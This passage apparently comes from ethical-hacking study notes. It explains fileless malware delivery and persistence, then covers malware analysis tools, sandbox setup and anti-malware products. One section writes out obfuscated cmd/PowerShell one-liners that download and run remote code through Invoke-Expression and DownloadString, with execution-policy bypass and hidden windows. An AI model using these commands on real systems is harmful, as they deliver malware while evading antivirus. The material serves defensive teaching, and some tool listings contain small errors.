Attackers commonly use social engineering techniques such as phishing to spread fileless malware to the target systems. They send spam emails embedded with malicious links to the victim. When the victim clicks on the link, he/she will be directed to a fraudulent website that automatically loads Flash and triggers the exploit. Furthermore, the fileless malware scans the target system for vulnerabilities in system tools such as PowerShell, WMI, and browser Java plug-ins. The malware exploits the identified vulnerability to download and run the malicious payload on the victim’s machine and compromises the sensitive information stored in the process memory. Fileless threats can also maintain persistence by creating AutoStart registry entries depending on the goal of the attacker.

**Steps followed by the attacker to launch fileless malware through phishing**

* The attacker sends a phishing email to the victim, embedded with a malicious link
* When the victim opens the email and clicks on the malicious link, the victim is automatically redirected to a fake website
* The fake website scans for vulnerabilities in the system, such as outdated Flash, to trigger the exploit
* Now, the fileless malware exploits system tools such as PowerShell to load and run the malicious payloads in memory. PowerShell downloads the malicious payloads from a remote command-and-control server
* The AutoStart registry key is created for storing the malicious script in the victim’s system to maintain persistence
* Once the malicious payload is injected, it steals critical information, performs data exfiltration, and sends all the data to the attacker

### Maintaining Persistence with Fileless Techniques

* When compared to other malware types, fileless malware does not use disk files to spread its infection or maintain persistence.
* Attackers adopt unique methods such as developing load points to restart infected payloads to maintain persistence.
* Attackers save the malicious payload inside the registry that holds data for configurations, application files, and settings, which executes itself with every system restart.

### Fileless Malware

* Divergent
* Astaroth Backdoor  
* Nodersok  
* Vaporworm  
* njRat Backdoor  
* Sodinokibi Ransomware  
* Kovter and Poweliks  
* Dridex  
* Hancitor/Chanitor  
* Sorebrect Ransomware

### Fileless Malware Obfuscation Techniques to Bypass Antivirus

**Inserting Characters**: Attackers insert special characters such as comma\(,\) and semicolon \(;\) between malicious commands and strings to make well-known commands more complex to detect.

```text
,;cmd.exe,/c,;,echo;powershell.exe -NoExit -exec bypass -nop Invoke-Expression(New-Object System.Net.WebClient).DownloadString(‘https://targetwebsite.com”)&&echo,exit
```

**Inserting Parentheses**: When parentheses are used, variables in a code block are evaluated as a single line command. Attackers exploit this feature to split and obfuscate malicious commands.

```text
cmd.exe /c ((echo command1) 
&&( 
echo command2))
```

**Inserting Caret Symbol**: The caret symbol \(^\) is a reserved character used in shell commands for escaping. Attackers exploit this feature to escape malicious commands during execution time.

```text
C:\WINDOWS\system32\cmd.exe /c p^^o^^w^^e^^r^^s^^h^^e^^l^^l^^.^^e^^x^^e -No^^Exit -exec bypass -nop Invoke-Expression (New-Object System.Net.WebClient). DownloadString((‘https://targetwebsite.com”)&&echo,exit
```

**Inserting Double Quotes**: The command line parser uses the double quote symbol as an argument delimiter. Attackers use this symbol to concatenate malicious commands in arguments.

```text
Pow””er””Shell -N””oExit -ExecutionPolicy bypass -noprofile -windowstyle hidden cmd /c Flower.jpg
```

**Using Custom Environment Variables**: In the Windows operating system, environment variables are dynamic objects that store modifiable values used by applications at runtime. Attackers exploit environment variables to split malicious commands into multiple string.

```text
set a=Power &&set b=Shell && %a:~0,-1%%b% -ExecutionPolicy bypass -noprofile -windowstyle hidden cmd /c Products.pdf
```

**Using Pre-assigned Environment Variables**: “%CommonProgramFiles%” contains a default value “C:\Program Files\Common Files”. Specific characters from this value can be accessed through indexing and used to execute malicious commands

```text
cmd.exe /c “%CommonProgramFiles:~3,1%owerShell.exe” -windowstyle hidden -command wscript myscript.vbc
```

## 6. Malware Analysis

### What is Sheep Dip Computer?

* Sheep dipping refers to the analysis of suspect files, incoming messages, etc. for malware.
* A sheep dip computer is installed with port monitors, file monitors, network monitors, and antivirus software and connects to a network only under strictly controlled condition.

Sheep Dipping Process Tasks:

* Run user, group permission, and process monitors
* Run device driver and file monitors 
* Run port and network monitors
* Run registry and kernel monitors 

### Antivirus Sensor Systems

An antivirus sensor system is a collection of computer software that detects and analyzes malicious code threats such as viruses, worms, and Trojans. It is used along with sheep dip computers.

### Introduction to Malware Analysis

Malware analysis is a process of reverse engineering a specific piece of malware to determine the origin, functionality, and potential impact of a given type of malware.

#### Why Malware Analysis?

* To exactly determine what happened 
* To determine the malicious intent of malware software 
* To identify indicators of compromise 
* To determine the complexity level of an intruder 
* To identify the exploited vulnerability 
* To identify the extent of damage caused by the intrusion 
* To catch the perpetrator accountable for installing the malware

The most common business questions answered by malware analysis are as follows:

* What is the intention of the malware? 
* How did it get through? 
* What is its impact on the business? 
* Who are the perpetrators, and how good are they? 
* How to abolish the malware? 
* What are the losses? 
* How long has the system been infected? 
* What is the medium of the malware? 
* What are the preventive measures?

### Types of Malware Analysis

It is recommended that both static and dynamic analyses be performed to obtain a detailed understanding of the functionality of the malware.

#### Static Malware Analysis

Also known as code analysis. It involves going through the executable binary code without executing it to have a better understanding of the malware and its purpose.

* In static analysis, we do not run the malware code, so there is no need to create a safe environment.
* It employs different tools and techniques to quickly determine if a file is malicious.
* Analyzing the binary code provides information about the malware functionality, its network signatures, exploit packaging technique, dependencies involved, etc.

Some static malware analysis techniques are listed below:

**1. File fingerprinting**

* File fingerprinting is the process of computing the hash value for a given binary code
* You can use the computed hash value to uniquely identify the malware or periodically verify if any changes are made to the binary code during analysis 
* Use tools like HashMyFiles to calculate various hash values of the malware file

Tools:

* HashMyFiles: HashMyFiles produces the hash value of a file using MD5, SHA1, CRC32, SHA-256, SHA-512 and SHA-384 algorithms.
* [Mimikatz](https://github.com) 
* [Hashtab](http://implbits.com) 
* [HashCalc](https://www.slavasoft.com) 
* [hashdeep](https://sourceforge.net) 
* [MD5sums](http://www.pc-tools.net)

**2. Local and online malware scanning**

* Scan the binary code locally using well-known and up-to-date antivirus software 
* If the code under analysis is a component of a well-known malware, it may have been discovered already and documented by many antivirus vendors 
* You can also upload the code to online websites such as VirusTotal to get it scanned by a wide-variety of different scan engines

Online Tools:

* \[VirusTotal\]: VirusTotal is a free service that analyzes suspicious files and URLs and facilitates the detection of viruses, worms, Trojans, etc.
* [Hybrid Analysis](https://www.hybrid-analysis.com) 
* [Cuckoo Sandbox](https://cuckoosandbox.org) 
* [Jotti](https://virusscan.jotti.org) 
* [Valkyrie Sandbox](https://valkyrie.comodo.com) 
* [Online Scanner](https://www.fortiguard.com)

**3. Performing strings search**

* Strings communicate information from the program to its user
* Analyze embedded strings of the readable text within the program’s executable file Example: Status update strings and error strings
* Use tools such as BinText to extract embedded strings from executable file

**String Searching Tools**:

* BinText: BinText is a text extractor that can extract text from any kind of file and has the ability to find plain ASCII text, Unicode text and Resource strings, thus providing useful information for each item.
* [FLOSS](https://www.fireeye.com) 
* [Strings](https://docs.microsoft.com) 
* [Free EXE DLL Resource Extract](http://www.resourceextract.com) 
* [FileSeek](https://www.fileseek.ca) 
* [Hex Workshop](http://www.hexworkshop.com)

**4. Identifying packing/obfuscation methods**

* Attackers often use packers to compress, encrypt, or modify a malware executable file to avoid detection.
* It complicates the task for the reverse engineers in finding out the actual program logic and other metadata via static analysis.
* Use tools such as PEid that detects most common packers, cryptors, and compilers for PE executable files.

**Packaging/Obfuscation Tools**:

* PEid: The PEiD tool provides details about the Windows executable files. It can identify signatures associated with over 600 different packers and compilers.
* [Macro\_Pack](https://github.com) 
* [UPX](https://upx.github.io) 
* [ASPack](http://www.aspack.com)

**5. Finding the portable executables \(PE\) information**

* The PE format is the executable file format used on Windows operating systems
* Analyze the metadata of PE files to get information such as time and date of compilation, functions imported and exported by the program, linked libraries, icons, menus, version information, and strings that are embedded in resources 
* Use tools such as PE Explorer to extract the above-mentioned information

The PE of a file contains the following sections:

* .text: Contains instructions and program code that the CPU executes. 
* .rdata: Contains the import and export information as well as other read-only data used by the program.
* .data: Contains the program’s global data, which the system can access from anywhere. 
* .rsrc: Consists of the resources employed by the executable, such as icons, images, menus, and strings, as this section offers multi-lingual support.

**PE Extraction Tools**:

* PE Explorer: PE Explorer lets you open, view, and edit a variety of different 32-bit Windows executable file types \(also called PE files\) ranging from the common, such as EXE, DLL, and ActiveX Controls.
* [Portable Executable Scanner \(pescan\)](https://tzworks.net) 
* [Resource Hacker](http://www.angusj.com) 
* [PEView](https://www.aldeid.com)

**6. Identifying file dependencies**

* Programs need to work with internal system files to properly function 
* Programs store the import and export functions in the kernel32.dll file 
* Check the dynamically linked list in the malware executable file 
* Finding out all the library functions may allow you to estimate what the malware program can do 
* Use tools such as DependencyWalker to identify the dependencies within the executable file

**Dependency Checking Tools**:

* Dependency Walker: Dependency Walker lists all the dependent modules of an executable file and builds hierarchical tree diagrams. It also records all the functions of each module exports and calls.
* [Dependency-check](https://jeremylong.github.io) 
* [Snyk](https://snyk.io) 
* [Hakiri](https://hakiri.io) 
* \[RetireJS\]\([https://retirejs.github.io](https://retirejs.github.io)

**7. Malware disassembly**

* Disassemble the binary code and analyze the assembly code instructions
* Use tools such as IDA that can reverse the machine code to assembly language 
* Based on the reconstructed assembly code, you can inspect the program logic and recognize its threat potential. This process is performed using debugging tools such as OllyDbg \([http://www.ollydbg.de](http://www.ollydbg.de)\)

**Disassembling and Debugging Tools**:

* IDA: IDA is a Windows, Linux or Mac OS X hosted multi-processor disassembler and debugger that can debug through Instructions tracing, Functions tracing, and Read/Write-Write-Execute tracing features.
* [Ghirda](https://ghidra-sre.org) 
* [Radare2](https://rada.re) 
* [OllyDbg](http://www.ollydbg.de) 
* [WinDbg](http://www.windbg.org) 
* [ProcDump](https://docs.microsoft.com)

#### Dynamic Malware Analysis

Also known as behavioral analysis. It involves executing the malware code to know how it interacts with the host system and its impact on the system after infection.

* In dynamic analysis, the malware is executed on a system to understand its behavior after infection 
* This type of analysis requires a safe environment such as virtual machines and sandboxes to deter the spreading of malware 

Dynamic analysis consists of two stages:

* **System Baselining**
  * Refers to taking a snapshot of the system at the time the malware analysis begins, which can be compared with the system’s state after executing the malware file.
  * The main purpose of system baselining is to identify significant changes from the baseline state
  * The system baseline includes details of the file system, registry, open ports, network activity, etc.
* **Host Integrity Monitoring**
  * Host integrity monitoring involves taking a snapshot of the system state using the same tools before and after analysis, to detect changes made to the entities residing on the system
    * **Port Monitoring** 
      * Malware programs corrupt the system and open system input/output ports to establish connections with remote systems, networks, or servers to accomplish various malicious tasks
      * Use port monitoring tools such as netstat, and TCPView to scan for suspicious ports and look for any connection established to unknown or suspicious IP addresses
      * Port Monitoring Tools 
        * [Port Monitor](https://www.port-monitor.com) 
        * [CurrPorts](https://www.nirsoft.net)
        * [TCP Port Monitoring](https://www.dotcom-monitor.com)
        * [PortExpert](http://www.kcsoftwares.com)
        * [PRTG's Network Monitor](https://www.paessler.com)
        * [TCPView Source](https://docs.microsoft.com) is a Windows program that shows detailed listings of all TCP and UDP endpoints on the system, including the local and remote addresses, and the state of the TCP connections.
        * `netstat -an` displays all the active TCP connections as well as the TCP and UDP ports on which the computer is listening along with the addresses and port numbers.
    * **Process Monitoring** 
      * Malware programs camouflage themselves as genuine Windows services or hide their processes to avoid detection.
      * Some malware programs also use PEs \(Portable Executable\) to inject into various processes \(such as explorer.exe or web browsers\)
      * Use process monitoring tools like [Process Monitor](https://docs.microsoft.com) to scan for suspicious processes.
      * Process Monitoring Tools
        * [Process Explorer](https://docs.microsoft.com) 
        * [OpManager](https://www.manageengine.com) 
        * [Monit](https://mmonit.com) 
        * [ESET SysInspector](https://www.eset.com) 
        * [System Explorer](http://systemexplorer.net)\
    * **Registry Monitoring** 
      * The Windows registry stores OS and program configuration details, such as settings and options.
      * Malware uses the registry to perform harmful activity continuously by storing entries into the registry and ensuring that the malicious program runs automatically whenever the computer or device boots.
      * Use registry entry monitoring tools such as jv16 PowerTools to examine the changes made by the malware to the system’s registry
      * Windows automatically executes instructions in the following sections of the registry: 
        * `Run`
        * `RunServices`
        * `RunOnce`
        * `RunServicesOnce`
        * `HKEY_CLASSES_ROOT\exefile\shell\open\command "%1" %*.`
      * Malware inserts instructions in these sections of the registry to perform malicious activities. You should have fair knowledge of the Windows registry, its contents, and inner workings to analyze the presence of malware.
      * Registry Monitoring Tools
        * [regshot](https://sourceforge.net) 
        * [Reg Organizer](https://www.chemtable.com) 
        * [Registry Viewer](https://accessdata.com) 
        * [RegScanner](https://www.nirsoft.net) 
        * [Registrar Registry Manager](https://www.resplendence.com)
    * **Windows Services Monitoring** 
      * Malware spawns Windows services that allow attackers to get remote control of the victim’s machine and pass malicious instructions
      * Malware rename their processes to look like a genuine Windows service to avoid detection
      * Malware may also employ rootkit techniques to manipulate `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services` registry keys to hide its processes
      * Use Windows services monitoring tools such as [Windows Service Manager](http://tools.sysprogs.org) \(SrvMan\) to trace malicious services initiated by the malware.
        * You can use SrvMan's command-ine interface to perform the following tasks:
          * Create services: `srvman.exe add <file.exe/file.sys> [service name] [display name] [/type:<service type>] [/start:<start mode>] [/interactive:no] [/overwrite:yes]`
          * Delete services: `srvman.exe delete <service name>`
          * Start/stop/restart services: 
            * `srvman.exe start <service name> [/nowait] [/delay:<delay in msec>]`
            * `srvman.exe stop <service name> [/nowait] [/delay:<delay in msec>]`
            * `srvman.exe restart <service name> [/delay:<delay in msec>]`
          * Install and start a legacy driver with a single call
            * `srvman.exe run <driver.sys> [service name] [/copy:yes] [/overwrite:no] [/stopafter:<msec>]`
      * Windows Service Monitoring Tools
        * [Advanced Windows Service Manager](https://securityxploded.com)
        * [Process Hacker](https://processhacker.sourceforge.io) 
        * [Netwrix Service Monitor](https://www.netwrix.com) 
        * [AnVir Task Manager](https://www.anvir.com)
        * [Service+](https://www.activeplus.com)
    * **Startup Programs Monitoring**
      * Malware can alter the system settings and add themselves to the startup menu to perform malicious activities whenever the system starts.
      * Manually check or use startup monitoring tools like [Autoruns](https://docs.microsoft.com) for Windows andWinPatrol to detect suspicious startup programs and processes.
      * Steps to manually detect hidden malware:
        1. Check startup program entries in the registry editor 
        2. Check device drivers that are automatically loaded: `C:\Windows\System32\drivers` 
        3. Check `boot.ini` or bcd \(bootmgr\) entries
        4. Check Windows services that are automatically started: Go to Run -&gt; Type services.msc -&gt; Sort by Startup Type.
        5. Check the startup folder: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Start`
      * Some additional startup programs monitoring tools are as follows:  
        * [WinPatrol](http://www.winpatrol.com) 
        * [Autorun Organizer](https://www.chemtable.com) 
        * [Quick Startup](https://www.glarysoft.com) 
        * [StartEd Pro](http://www.outertech.com) 
        * [Chameleon Startup Manager](http://www.chameleon-managers.com) 
    * **Event Logs Monitoring/Analysis**
      * Log analysis is a process of analyzing computer-generated records or activities to identify malicious or suspicious events 
      * Use log analysis tools like Splunk to identify suspicious logs or events with malicious intent
      * Splunk: It is a SIEM tool that can automatically collect all the events logs from all the systems present in the network.
      * Log Analysis Tools
        * [ManageEngine Event Log Analyzer](https://www.manageengine.com)
        * [Loggly](https://www.loggly.com)
        * [SolarWinds Log & Event Manager \(LEM\)](https://www.solarwinds.com)
        * [Netwrix Event Log Manager](https://www.netwrix.com)
    * **Installation Monitoring** 
      * When the system or users install or uninstall any software application, there is a chance that traces of the application data are left on the system
      * Installation monitoring will help in detecting hidden and background installations that the malware performs
      * Use installation monitoring tools such as [Mirekusoft Install Monitor](https://www.mirekusoft.com) for monitoring the installation of malicious executables
      * Installation Monitoring Tools
        * [SysAnalyzer](https://www.aldeid.com) 
        * [Advanced Uninstaller PRO](https://www.advanceduninstaller.com) 
        * [REVO UNINSTALLER PRO](https://www.revouninstaller.com) 
        * [Comodo Programs Manager](https://www.comodo.com)
    * **Files and Folders Monitoring** 
      * Malware programs normally modify system files and folders after infecting a computer
      * Use file and folder integrity checkers like PA File Sight, Tripwire, and Netwrix Auditor to detect changes in system files and folders
      * File and Folder Integrity Checking Tools
        * [Tripwire File Integrity and Change Manager](https://www.tripwire.com) 
        * [Netwrix Auditor](https://www.netwrix.com) 
        * [Verisys](https://www.ionx.co.uk)
        * [CSP File Integrity Checker](https://www.cspsecurity.com)
        * [NNT Change Tracker](https://www.newnettechnologies.com)
        * PA File Sight: It audits who is deleting files, moving files, or reading files. It also detects users copying files and optionally blocks access.
          * Compromised computers are blocked from reaching files on other protected servers on the network
          * Detects users copying files and optionally blocks access 
          * Real-time alerts allow appropriate staff to investigate immediately
          * Monitors who is deleting, moving, or reading files
    * **Device Drivers Monitoring** 
      * Malware is installed along with device drivers downloaded from untrusted sources, and attackers use these drivers as a shield to avoid detection
      * Use device driver monitoring tools such as DriverView to scan for suspicious device drivers and verify if the device drivers are genuine and downloaded from the publisher’s original site
      * `Go to Run -> Type msinfo32 -> Software Environment  -> System Drivers to manually check for installed drivers`
      * Device Driver Monitoring Tools
        * [Driver Booster](https://www.iobit.com) 
        * [Driver Reviver](https://www.reviversoft.com) 
        * [Driver Easy](https://www.drivereasy.com) 
        * [Driver Fusion](https://treexy.com) 
        * [Driver Genius](http://www.driver-soft.com)
        * DriverView: DriverView utility displays a list of all the device drivers currently loaded on the system along with information such as load address of the driver, description, version, and product name.
    * **Network Traffic Monitoring/Analysis** 
      * Malware programs connect back to their handlers and send confidential information to attackers
      * Use network scanners and packet sniffers to monitor network traffic going to malicious remote addresses
      * Use network scanning tools such as SolarWinds NetFlow Traffic Analyzer and Capsa to monitor network traffic and look for suspicious malware activities
      * Network Activity Monitoring Tools
        * [Caspa Network Analyzer](https://www.colasoft.com) 
        * [Wireshark](https://www.wireshark.org) 
        * [PRTG Network Monitor](https://kb.paessler.com) 
        * [GFI LanGuard](https://www.gfi.com) 
        * [NetFort LANGuardian](https://www.netfort.com)
        * SolarWinds NetFlow Traffic Analyzer: NetFlow Traffic Analyzer collects traffic data, correlates it into a useable format, and presents it to the user in a web-based interface for monitoring network traffic
          * Features:
          * Network traffic analysis
          * Bandwidth monitoring
          * Application traffic alerting 
          * Performance analysis 
          * CBQoS policy optimization 
          * Malicious or malformed traffic flow identification
    * **DNS Monitoring/Resolution** 
      * DNSChanger is a malicious software capable of changing the system’s DNS server settings and provides the attackers with the control of the DNS server used on the victim’s system
      * Use DNS monitoring tools such as DNSQuerySniffer to verify the DNS servers that the malware tries to connect to and identify the type of connection
      * DNS Monitoring/Resolution ToolsÑ
        * [DNSstuff](https://www.dnsstuff.com) 
        * [DNS Lookup Tool](https://www.ultratools.com) 
        * [Sonar Lite](https://constellix.com)
        * [DNSQuerySniffer](https://www.nirsoft.net) DNSQuerySniffer is a network sniffer utility that shows the DNS queries sent on your system. For every DNS query, the following information is displayed: host name, port number, query ID, request type \(A, AAAA, NS, MX, and so on\), request time, response time, duration, response code, number of records, and content of the returned DNS records. You can easily export the DNS query information to a CSV/tab-delimited/XML/HTML file or copy the DNS queries to the clipboard and then paste them into Excel or other spreadsheet applications.
    * **API Calls Monitoring**
      * Application programming interfaces \(APIs\) are parts of the Windows OS that allow external applications to access OS information such as file systems, threads, errors, registry, and kernel 
      * Malware programs employ these APIs to access the operating system information and cause damage to the systems 
      * Analyzing the API calls may reveal the suspected program’s interaction with the OS 
      * Use API call monitoring tools such as API Monitor to monitor API calls made by applications
      * API Call Monitoring Tools
        * [APImetrics](https://apimetrics.io) 
        * [Runscope](https://www.runscope.com) 
        * [AlertSite](https://smartbear.com)

### Malware Analysis Procedure: Preparing Testbed

1. Allocate a physical system for the analysis lab 
2. Install a Virtual machine \(VMware, Hyper-V, etc.\) on the system 
3. Install guest OS on in the Virtual machine\(s\) 
4. Isolate the system from the network by ensuring that the NIC card is in “host only” mode 
5. Simulate internet services using tools such as INetSim
6. Disable the “shared folders“ and “guest isolation“ 
7. Install malware analysis tools
8. Generate the hash value of each OS and tool 
9. Copy the malware over to the guest OS

#### Some tools

Network and Internet Simulation Tools:

* [NetSim Pro](https://tetcos.com) 
* [ns-3](https://www.nsnam.org) 
* [Riverbed Modeler](http://www.riverbed.com) 
* [QualNet](http://web.scalable-networks.com)

OS Backup and Imaging Tools:

* [Genie Backup Manager Pro](https://www.zoolz.com) 
* [Macrium Reflect Server](https://www.macrium.com) 
* [R-Drive Image](https://www.drive-image.com) 
* [O&O DiskImage 14](https://www.oo-software.com)

### Virus Detection Methods

* Scanning: 
  * Once a virus is detected, it is possible to write scanning programs that look for signature string characteristics of the virus.
* Integrity Checking: 
  * Integrity checking products work by reading the entire disk and recording integrity data that act as a signature for the files and system sectors
* Interception Code Emulation: 
  * The interceptor monitors the operating system requests that are written to the disk
* Code Emulation:
  * In code emulation techniques, the antivirus executes the malicious code inside a virtual machine to simulate CPU and memory activities
  * These techniques are considered very effective in dealing with encrypted and polymorphic viruses if the virtual machine mimics the real machine
* Heuristic Analysis: 
  * Heuristic analysis can be static or dynamic 
  * In static analysis, the antivirus analyses the file format and code structure to determine if the code is viral
  * In dynamic analysis, the antivirus performs a code emulation of the suspicious code to determine if the code is viral

## 7. Countermeasures

## 8. Anti-Malware Software

### Anti-Trojan Software

* Kaspersky Internet Security: Kaspersky Internet Security provides protection against Trojans, viruses, spyware, ransomware, phishing, and dangerous websites.
* McAfee® LiveSafeTM \([https://www.mcafee.com](https://www.mcafee.com)\)
* Symantec Norton Security Premium \([https://www.symantec-norton.com](https://www.symantec-norton.com)\) 
* Bitdefender Total Security \([https://bitdefender.com](https://bitdefender.com)\) 
* HitmanPro \([https://www.hitmanpro.com](https://www.hitmanpro.com)\) 
* Malwarebytes \([https://www.malwarebytes.org](https://www.malwarebytes.org)\) 
* Zemana Antimalware \([https://www.zemana.com](https://www.zemana.com)\)
* Emsisoft Anti-Malware Home \([https://www.emsisoft.com](https://www.emsisoft.com)\)
* Malicious Software Removal Tool \([https://www.microsoft.com](https://www.microsoft.com)\)
* SUPERAntiSpyware \([https://www.superantispyware.com](https://www.superantispyware.com)\) 
* Plumbytes Anti-Malware \([https://plumbytes.com](https://plumbytes.com)\)

### Antivirus Software

Bitdefender Antivirus Plus 2019 works against all threats – from viruses, worms and Trojans, to ransomware, zero-day exploits, rootkits and spyware.

### Fileless Malware Detection Tools

AlienVault® USM AnywhereTM: AlienVault® USM AnywhereTM provides a single unified platform for threat detection, incident response, and compliance management.

* Quick Heal Total Security [http://www.quickheal.com](http://www.quickheal.com)
* Endpoint Detection and Response \(EDR\) [https://www.trendmicro.com](https://www.trendmicro.com)
* Defender Check [https://github.com](https://github.com)
* FCL [https://github.com](https://github.com)
* CYNET 360 [https://www.cynet.com](https://www.cynet.com)

### Fileless Malware Protection Tools

McAfee End Point Security: McAfee End Point Security is a security tool used by security professionals to perform threat detection, investigation, and response activities

Some additional fileless malware protection tools are as follows:

* Microsoft Defender Advanced Threat Protection \([https://docs.microsoft.com](https://docs.microsoft.com)\) 
* Kaspersky End Point Security for Business \([https://www.kaspersky.com](https://www.kaspersky.com)\) 
* Trend Micro Smart Protection Suites \([https://www.trendmicro.com](https://www.trendmicro.com)\) 
* Norton 360 with LifeLock Select \([https://us.norton.com](https://us.norton.com)\) 
* REVE Antivirus \([https://www.reveantivirus.com](https://www.reveantivirus.com)\)

## Module Summary

In this module, we discussed the following:

* Concepts of malware and malware propagation techniques 
* Concepts of APT and its lifecycle 
* Concepts of Trojans, their types, and how they infect systems
* Concepts of viruses, their types, and how they infect files along with the concept of computer worms
* Concepts of fileless malware and how they infect files
* How to perform static and dynamic malware analysis and explained different techniques to detect malware
* Various Trojan, backdoor, virus, and worm countermeasures 
* Various Anti-Trojan and Antivirus tools

In the next module, we will discuss in detail how attackers, as well as ethical hackers and pen-testers. use sniffing to collect information about a target of evalua

